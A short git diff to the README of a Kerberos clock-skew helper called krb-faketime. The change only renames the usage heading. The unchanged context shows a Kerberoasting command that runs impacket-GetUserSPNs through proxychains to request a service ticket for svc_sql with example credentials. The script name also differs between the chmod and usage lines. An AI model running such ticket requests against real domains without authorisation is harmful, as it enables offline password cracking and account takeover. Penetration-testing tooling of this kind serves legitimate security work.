@@ -21,7 +21,7 @@ $ cd krb-faketime
 $ chmod +x krbtime.sh
 ```
 
-## Usage
+## Usage example while proxychaining
 
 ```bash
 $ ./kerbtime.sh proxychains -q impacket-GetUserSPNs -dc-ip 172.16.1.15 -request-user svc_sql domain.local/websec:Password123!
